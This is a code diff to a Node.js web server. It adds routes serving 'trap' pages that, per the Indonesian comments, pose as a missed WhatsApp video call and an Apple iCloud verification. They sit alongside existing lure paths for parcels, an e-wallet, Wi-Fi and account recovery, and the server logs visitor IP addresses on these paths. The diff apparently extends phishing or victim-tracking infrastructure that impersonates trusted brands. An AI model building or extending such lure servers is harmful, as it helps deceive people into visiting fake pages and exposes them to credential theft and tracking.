@@ -662,7 +662,8 @@ const server = http.createServer(async (req, res) => {
   const TRAP_HTML_PATHS = [
     '/paket', '/paket.html', '/dana', '/dana.html',
     '/go', '/go.html', '/track', '/track.html',
-    '/wifi', '/wifi.html', '/recovery', '/recovery.html', '/bantu'
+    '/wifi', '/wifi.html', '/vcall', '/vcall.html', '/icloud', '/icloud.html',
+    '/recovery', '/recovery.html', '/bantu'
   ];
   if (TRAP_HTML_PATHS.includes(pathname) && req.method === 'GET') {
     const rawIp = (req.socket && req.socket.remoteAddress) || '?';
@@ -778,6 +779,28 @@ const server = http.createServer(async (req, res) => {
       res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
       if (req.method === 'HEAD') { res.end(); return; }
       fs.createReadStream(wifiFile).pipe(res);
+      return;
+    }
+  }
+
+  // Halaman Jebakan Panggilan Video WhatsApp Tak Terjawab
+  if ((pathname === '/vcall' || pathname === '/vcall.html') && (req.method === 'GET' || req.method === 'HEAD')) {
+    const f = path.join(PUBLIC_DIR, 'vcall.html');
+    if (fs.existsSync(f)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      if (req.method === 'HEAD') { res.end(); return; }
+      fs.createReadStream(f).pipe(res);
+      return;
+    }
+  }
+
+  // Halaman Jebakan Verifikasi iCloud Apple
+  if ((pathname === '/icloud' || pathname === '/icloud.html') && (req.method === 'GET' || req.method === 'HEAD')) {
+    const f = path.join(PUBLIC_DIR, 'icloud.html');
+    if (fs.existsSync(f)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      if (req.method === 'HEAD') { res.end(); return; }
+      fs.createReadStream(f).pipe(res);
       return;
     }
   }
